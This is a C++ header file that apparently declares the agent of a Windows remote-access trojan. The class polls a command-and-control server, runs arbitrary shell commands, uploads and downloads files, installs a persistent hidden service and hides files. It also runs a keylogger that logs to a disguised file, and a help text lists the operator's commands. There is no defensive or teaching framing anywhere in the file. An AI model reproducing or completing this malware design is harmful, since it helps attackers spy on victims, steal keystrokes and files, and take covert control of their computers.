#pragma once

#include "includes.h"
#include "define.h"

class Agent {
public:

	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent",
		const std::string& _user_agent = "Mozilla/4.0 (compatible)", const std::string& _KeyloggerFile = "c:\bootlog.txt");

	std::string run_command(const std::string& command, bool isLocal = false);
	void cd(const std::string& newdir);
	void download(const std::string& url);
	void upload(const std::string& filename);
	void persist(const std::string& options);
	void open(const std::string& args);
	void hide_unhide_file(const std::string& filename);
	void GetStatus(void);
	void keylogger(bool state = false);
	void help();

	void setInterval(const unsigned int new_interval);
	void setServiceName(const std::string& new_servicename);
	void setKeyloggerFile(const std::string& new_KeyloggerFile);

	void run();
	void execute(const std::string& commandline);
	void stop();

	void LockScreen(void);
	void GetOS(void);

private:

	std::string get_hostname();
	std::string get_os_name();
	std::string get_wd();
	std::string get_next_command();
	void send_output(const std::string& output);
	void wait_for_tick();

	std::string botid;
	std::string os_name;
	std::string server_url;
	unsigned int sleep_interval;
	std::string service_name;
	std::string user_agent;
	bool running;
	HANDLE keylogger_task;
	int shift = 0;
	int caps = 0;
};

#define HELP_TEXT \
	"Available commands\r\n"\
	"====================\r\n"\
	"You can stack commands with <com1>;<com2>;...\r\n"\
	"You can escape \";\" like this: \"\\;\"\r\n\r\n"\
	"cd <path>: change directory\r\n"\
	"<any shell command>: execute command and return output\r\n"\
	"persistence install|clean: install/remove persistent service\r\n"\
	"open <calc.exe>: run command asynchronously (no output)\r\n"\
	"download <http://url>: download file\r\n"\
	"hide_unhide <local/file>: Hide or unHide a local file\r\n"\
	"upload <local/file>: upload file\r\n"\
	"keylogger <start|stop>: start or stop keylogger sub-process\r\n"\
	"lockscreen : lock the screen\r\n"\
	"getos : Get the os name\r\n"\
	"help: this help\r\n"\
	"exit: kill agent\r\n"\
	"status: display some information of me\r\n"\
	"setinterval <10>: set time interval between each CNC pull\r\n"\
	"setservicename <name>: change persistent service name\r\n"\
	"setkeyloggerfile <name>: change the output file of the keylogger";